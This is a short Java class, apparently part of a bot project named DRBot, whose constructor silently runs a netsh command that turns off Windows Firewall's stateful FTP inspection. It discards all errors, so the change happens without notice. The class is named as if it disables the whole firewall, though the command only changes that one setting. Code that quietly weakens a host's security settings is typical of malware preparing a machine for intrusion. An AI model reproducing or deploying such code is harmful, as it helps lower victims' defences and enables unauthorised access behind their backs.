package com.DRBot.Firewall;

import java.io.IOException;

/**
 *
 * @author MerNat
 */

public class disableFirewall {
    
    private final ProcessBuilder pB;
    private Process ps;
    
    public disableFirewall(){
        pB = new ProcessBuilder("netsh","advfirewall","set","global","StatefulFTP","disable");
        try {
            ps = pB.start();
            ps.waitFor();
        } catch (IOException ex) {} catch (InterruptedException ex) {}
    }
}
